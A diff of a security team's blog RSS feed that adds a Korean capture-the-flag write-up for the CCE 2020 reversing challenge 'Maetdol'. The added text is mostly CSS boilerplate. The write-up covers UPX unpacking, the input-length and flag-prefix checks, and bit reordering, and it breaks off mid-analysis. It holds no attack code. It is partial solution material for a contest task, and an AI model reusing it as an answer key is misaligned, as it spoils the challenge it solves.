@@ -5,8 +5,8 @@
     <description>RAON Whitehat Core-Research-Team Blog</description>
     <link>http://202.182.127.225:4000/</link>
     <atom:link href="http://202.182.127.225:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 07 Jan 2021 01:13:56 +0000</pubDate>
-    <lastBuildDate>Thu, 07 Jan 2021 01:13:56 +0000</lastBuildDate>
+    <pubDate>Wed, 13 Jan 2021 00:53:43 +0000</pubDate>
+    <lastBuildDate>Wed, 13 Jan 2021 00:53:43 +0000</lastBuildDate>
     <generator>Jekyll v4.0.1</generator>
     
       <item>
@@ -4166,6 +4166,833 @@ DBVM Debugging은 VM Exit reason 중에서 EPT Violation을 이용하여 구현�
         <guid isPermaLink="true">http://202.182.127.225:4000/2020-10-01/CVE-2020-7460-63d35fa8400147edad4b95aab9fcfeab</guid>
         
         <category>cve</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>CCE 2020 - Maetdol</title>
+        <description>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;&lt;title&gt;&lt;/title&gt;&lt;style&gt;
+/* webkit printing magic: print all background colors */
+
+
+
+
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+
+
+
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+
+
+
+
+
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li &gt; ol:first-child,
+li &gt; ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul &gt; li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list &gt; li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle &gt; li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul &gt; li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol &gt; li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol &gt; li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle &gt; li &gt; details {
+	padding-left: 1.7em;
+}
+
+.toggle &gt; li &gt; details &gt; summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p &gt; .user {
+	opacity: 0.5;
+}
+
+td &gt; .user,
+td &gt; time {
+	white-space: nowrap;
+}
+
+input[type=&quot;checkbox&quot;] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+	white-space: pre-wrap;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code &gt; code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, &quot;Apple Color Emoji&quot;, Arial, sans-serif, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; }
+.code { font-family: &quot;SFMono-Regular&quot;, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, &quot;Yu Mincho&quot;, &quot;Hiragino Mincho ProN&quot;, &quot;Hiragino Mincho Pro&quot;, &quot;Songti TC&quot;, &quot;Songti SC&quot;, &quot;SimSun&quot;, &quot;Nanum Myeongjo&quot;, NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, &quot;Apple Color Emoji&quot;, Arial, sans-serif, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, &quot;SFMono-Regular&quot;, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, &quot;Yu Mincho&quot;, &quot;Hiragino Mincho ProN&quot;, &quot;Hiragino Mincho Pro&quot;, &quot;Songti TC&quot;, &quot;Songti SC&quot;, &quot;SimSun&quot;, &quot;Nanum Myeongjo&quot;, NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url(&quot;data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E&quot;);
+}
+
+.checkbox-off {
+	background-image: url(&quot;data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E&quot;);
+}
+	
+&lt;/style&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;page-body&quot;&gt;
+	&lt;blockquote id=&quot;8c0ad004-81f7-4e85-bfe3-e631229526a5&quot; class=&quot;&quot;&gt;&lt;strong&gt;2020.09&lt;/strong&gt;
+	라온화이트햇 핵심연구팀 최규범
+	kbchoi@raoncorp.com&lt;/blockquote&gt;
+&lt;hr id=&quot;45f0f058-1e1b-4426-8031-3ff0569051d9&quot;/&gt;&lt;p id=&quot;6e4cb13d-3c5c-42ed-9f20-2d13ea19be32&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;ul id=&quot;eb933523-0b64-4230-b5ab-a291d51ae5b1&quot; class=&quot;toggle&quot;&gt;&lt;li&gt;&lt;details open=&quot;&quot;&gt;&lt;summary&gt;&lt;strong&gt;목차&lt;/strong&gt;&lt;/summary&gt;&lt;hr id=&quot;95591210-f0c2-4cfe-aef5-1e9e3b922773&quot;/&gt;&lt;nav id=&quot;fee0fdf2-3df5-49a5-a8ce-db4f72015b3f&quot; class=&quot;block-color-gray table_of_contents&quot;&gt;&lt;div class=&quot;table_of_contents-item table_of_contents-indent-0&quot;&gt;&lt;a class=&quot;table_of_contents-link&quot; href=&quot;#6add7037-6432-4909-9298-50e1d729a155&quot;&gt;개요&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;table_of_contents-item table_of_contents-indent-0&quot;&gt;&lt;a class=&quot;table_of_contents-link&quot; href=&quot;#53a65a01-363a-4889-82be-f22b8b45c1d2&quot;&gt;바이너리 분석&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;table_of_contents-item table_of_contents-indent-0&quot;&gt;&lt;a class=&quot;table_of_contents-link&quot; href=&quot;#c1863d4e-b571-4947-a2b1-7bf2f8b8e9cc&quot;&gt;&amp;quot;그치만&amp;quot;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;table_of_contents-item table_of_contents-indent-0&quot;&gt;&lt;a class=&quot;table_of_contents-link&quot; href=&quot;#51ecf720-e1ed-4da0-96f2-179573257631&quot;&gt;역연산&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;table_of_contents-item table_of_contents-indent-0&quot;&gt;&lt;a class=&quot;table_of_contents-link&quot; href=&quot;#63de9e75-53e5-4859-a007-0b70654e57d5&quot;&gt;문제 풀이 코드&lt;/a&gt;&lt;/div&gt;&lt;/nav&gt;&lt;hr id=&quot;a98fbd18-5a0e-4cfb-8ee5-59e22cf60333&quot;/&gt;&lt;/details&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;6add7037-6432-4909-9298-50e1d729a155&quot; class=&quot;&quot;&gt;개요&lt;/h3&gt;&lt;p id=&quot;98305159-f992-4754-8953-44c4cbca73fe&quot; class=&quot;&quot;&gt;CCE 2020 예선 리버싱 문제 Maetdol 풀이 보고서입니다.&lt;/p&gt;&lt;p id=&quot;98c77633-731f-42c2-8828-1fc7f3853286&quot; class=&quot;&quot;&gt;대회 종료까지 4팀이 해결한 문제로, 패킹과 관련된 속임수때문에  문제 풀이에 혼돈을 주었습니다.&lt;/p&gt;&lt;p id=&quot;73755fb8-5176-46b5-a973-79ecd8fdfe80&quot; class=&quot;&quot;&gt;문제 해결까지 중간 중간 실패한 과정들도 포함하여, 문제 풀이 과정을 상세히 작성해보았습니다.&lt;/p&gt;&lt;p id=&quot;2183b332-5ccb-4d4b-9993-3bebaf780190&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;h3 id=&quot;53a65a01-363a-4889-82be-f22b8b45c1d2&quot; class=&quot;&quot;&gt;바이너리 분석&lt;/h3&gt;&lt;figure id=&quot;f8ed0b7b-0e30-4332-935f-336f3c99f687&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb.png&quot;&gt;&lt;img style=&quot;width:813px&quot; src=&quot;/assets/202010/202010_qb.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;a6d91ace-2c53-4380-9b19-4b7c4a6e9362&quot; class=&quot;&quot;&gt;먼저, Maetdol.exe를 Hex Editor로 기본적인 정보를 살펴보았다.&lt;/p&gt;&lt;p id=&quot;9a0ed803-6d2d-44a7-a998-827302fa30c7&quot; class=&quot;&quot;&gt;Section 정보에서 UPX 패커 정보를 알 수 있다.&lt;/p&gt;&lt;p id=&quot;77c461f7-a1d6-46fc-9aea-c576ae323af1&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;21c36372-d527-4985-8802-6703bbc8b082&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb1.png&quot;&gt;&lt;img style=&quot;width:631px&quot; src=&quot;/assets/202010/202010_qb1.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;3430011b-162f-4759-85bd-4d77f550564f&quot; class=&quot;&quot;&gt;UPX 패커의 &amp;#x27;-d&amp;#x27; 옵션을 통해서 바이너리를 Unpack 하였다.&lt;/p&gt;&lt;p id=&quot;7018fda6-c1f4-4440-b7f9-e49d7ca9e895&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;111af78e-330b-4134-b142-14fdd69f1ad3&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb2.png&quot;&gt;&lt;img style=&quot;width:429px&quot; src=&quot;/assets/202010/202010_qb2.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;c1254d22-be8d-462a-8bc5-26e4c3a876e6&quot; class=&quot;&quot;&gt;IDA를 통해 Unpack한 바이너리를 열고, 0x401000 주소를 분석하였다.
+&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;em&gt;&lt;strong&gt;(Windows 환경의 실행 파일 대부분이 해당 주소에서 주요 기능을 수행한다.)&lt;/strong&gt;&lt;/em&gt;&lt;/mark&gt;&lt;/p&gt;&lt;p id=&quot;aad98524-aeb8-4489-879c-8d2ba7d27572&quot; class=&quot;&quot;&gt;무언가 Hash로 보이는 데이터를 저장하는 것으로 보인다.&lt;/p&gt;&lt;p id=&quot;95cb9791-b74f-4426-a981-65802abc3925&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;35af7a00-a1a3-4f2a-9509-e0b6a37b7f63&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb3.png&quot;&gt;&lt;img style=&quot;width:487px&quot; src=&quot;/assets/202010/202010_qb3.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;b7b24c19-4dab-4395-91b7-8639bdf17e23&quot; class=&quot;&quot;&gt;scanf를 통해 입력 값을 받은 후, 최상위 비트가 존재하는지 확인한다.&lt;/p&gt;&lt;p id=&quot;62cd4360-1c21-43f4-b155-c123c239732f&quot; class=&quot;&quot;&gt;입력 받은 글자 수가 55글자인지, 0x80 미만의 출력 가능한 문자열인지 확인한다.&lt;/p&gt;&lt;p id=&quot;9aae17b5-66a2-4a4b-84f6-204950bcfa65&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;cf71ef4c-fc1c-4669-87fb-6b5150d85d14&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb4.png&quot;&gt;&lt;img style=&quot;width:464px&quot; src=&quot;/assets/202010/202010_qb4.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;1bb987bf-0532-4b5d-94d6-9fe1d77a1927&quot; class=&quot;&quot;&gt;글자 시작이 &amp;#x27;cce2020{M&amp;#x27;인지 확인 후, 입력 받은 글자를 이진 문자열로 변환한다.&lt;/p&gt;&lt;p id=&quot;0243ed11-5429-43a0-af8d-94137b98163b&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;f1982d76-60ea-4ffc-9f2c-45175f797ef5&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb5.png&quot;&gt;&lt;img style=&quot;width:277px&quot; src=&quot;/assets/202010/202010_qb5.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;8ceddf3a-d916-4397-8233-82835c43d8d0&quot; class=&quot;&quot;&gt;&amp;#x27;0&amp;#x27;을 7개 더한 후 변환한 이진 문자열의 크기가 392인지 확인한다.&lt;/p&gt;&lt;p id=&quot;29476160-a2bb-4a2f-96e1-dcf182c8d5de&quot; class=&quot;&quot;&gt;55개의 입력을 받고 7개의 &amp;#x27;0&amp;#x27;을 더했으므로 해당 이진 문자열 크기는 392가 된다.&lt;/p&gt;&lt;p id=&quot;1117bb91-dfcd-4561-b153-baf69de376b6&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;pre id=&quot;13465afc-a469-49fc-b291-6b06f478613c&quot; class=&quot;code&quot;&gt;&lt;code&gt;55 * 7 + 7 = 392&lt;/code&gt;&lt;/pre&gt;&lt;figure id=&quot;376cf9df-0d03-44f9-9ec3-fc6a5dca12b8&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb6.png&quot;&gt;&lt;img style=&quot;width:370px&quot; src=&quot;/assets/202010/202010_qb6.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;a72876cb-05e5-4ab8-bd7a-47f92c2ed29c&quot; class=&quot;&quot;&gt;그리고 어떠한 연산을 수행하여 다시 배열에 저장한다.&lt;/p&gt;&lt;p id=&quot;8a091ba6-9d8e-4a14-8b5a-45692ae03c72&quot; class=&quot;&quot;&gt;디버깅을 통해 &lt;strong&gt;입력 값 → 이진 문자열 → 배열&lt;/strong&gt;의 관계를 확인해보았다.&lt;/p&gt;&lt;p id=&quot;5bf7e79d-8904-4609-ad2f-f11876b7ac23&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;c5619b97-6ece-4a93-9ba6-dc6287172fed&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb7.png&quot;&gt;&lt;img style=&quot;width:445px&quot; src=&quot;/assets/202010/202010_qb7.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;e2a6bc46-fd5f-43a5-9094-f34ac01f6fe3&quot; class=&quot;&quot;&gt;위 비교 조건을 만족하는 임의 값을 입력하여 진행하였다.&lt;/p&gt;&lt;p id=&quot;0ee4275b-77b1-4282-94d2-230d1c0ab4c1&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;077bf354-8726-42b9-b931-2d6daed1681c&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb8.png&quot;&gt;&lt;img style=&quot;width:626px&quot; src=&quot;/assets/202010/202010_qb8.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;66b4118b-0e24-4e9a-a59a-4d75fa3273fc&quot; class=&quot;&quot;&gt;마지막 배열을 저장하는 Maetdol.exe+0x16CB를 디버깅하여 확인하였다.&lt;/p&gt;&lt;p id=&quot;7061974f-1ae7-4043-a5e2-03aa7c283d12&quot; class=&quot;&quot;&gt;처음에는 0xC7이 저장된다. &lt;/p&gt;&lt;p id=&quot;cb1bbd6d-f356-40d2-8321-dc47295a8e12&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;d9c47444-e710-4080-a62d-5804c4aa7edb&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb9.png&quot;&gt;&lt;img style=&quot;width:455px&quot; src=&quot;/assets/202010/202010_qb9.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;780f9c32-e65d-4a48-a3f3-131ee574777e&quot; class=&quot;&quot;&gt;위와 같은 데이터가 배열에 저장되었다. 이진 데이터로 보면, &amp;#x27;&lt;strong&gt;11000111 10001110 10011010&lt;/strong&gt; ...&amp;#x27; 이다.&lt;/p&gt;&lt;p id=&quot;0d9bbc92-70ce-4c03-8c4c-15f0a88a35a6&quot; class=&quot;&quot;&gt;입력 값 &amp;#x27;cce...&amp;#x27;를 이진 데이터로 보면, &amp;#x27;&lt;strong&gt;01100011 01100011 01100101&lt;/strong&gt; ...&amp;#x27; 이다.
+&lt;/p&gt;&lt;p id=&quot;4d64529b-d5aa-4a6d-b315-918e94248a4a&quot; class=&quot;&quot;&gt; &amp;#x27;&lt;mark class=&quot;highlight-red&quot;&gt;&lt;strong&gt;1100011&lt;/strong&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;&lt;strong&gt;1 100011&lt;/strong&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-teal&quot;&gt;&lt;strong&gt;10 10011&lt;/strong&gt;&lt;/mark&gt;&lt;strong&gt;010&lt;/strong&gt; ...&amp;#x27; ⇒ 저장된 배열&lt;/p&gt;&lt;p id=&quot;565f836a-9f63-43cb-9d5e-fa4be4d8c6da&quot; class=&quot;&quot;&gt; &amp;#x27;&lt;strong&gt;0&lt;/strong&gt;&lt;mark class=&quot;highlight-red&quot;&gt;&lt;strong&gt;1100011&lt;/strong&gt;&lt;/mark&gt;&lt;strong&gt; 0&lt;/strong&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;&lt;strong&gt;1100011&lt;/strong&gt;&lt;/mark&gt;&lt;strong&gt; 0&lt;/strong&gt;&lt;mark class=&quot;highlight-teal&quot;&gt;&lt;strong&gt;1100101&lt;/strong&gt;&lt;/mark&gt; ...&amp;#x27; ⇒ &amp;#x27;cce...&amp;#x27;&lt;/p&gt;&lt;p id=&quot;a79eb4a9-df45-495d-93a2-b5bc19c21756&quot; class=&quot;&quot;&gt;
+자세히 보니 둘과의 관계가 일부 보인다.&lt;/p&gt;&lt;p id=&quot;06837f6f-18fd-4f20-99a1-7baf65b4cf99&quot; class=&quot;&quot;&gt;우선 이미 상위 비트를 검사하였기에, 입력 값에서 7개 비트만 사용한 것을 알 수 있다.&lt;/p&gt;&lt;p id=&quot;d1425a42-9812-4d9b-9b33-0022ec9ab834&quot; class=&quot;&quot;&gt;&lt;strong&gt;&amp;#x27;e&amp;#x27; ⇒ &lt;/strong&gt;&lt;mark class=&quot;highlight-teal&quot;&gt;&lt;strong&gt;1100101 &lt;/strong&gt;&lt;/mark&gt;&lt;strong&gt;⇒ &lt;/strong&gt;&lt;mark class=&quot;highlight-teal&quot;&gt;&lt;strong&gt;1010011&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;&lt;p id=&quot;05f63ade-d958-4578-ad3c-504175bdb9c3&quot; class=&quot;&quot;&gt;또한 이진 문자열로 변경하면서, 그 순서를 뒤집은 것으로 보여진다.&lt;/p&gt;&lt;p id=&quot;1cffc783-06f1-48d9-b45c-e8f04244a063&quot; class=&quot;&quot;&gt;
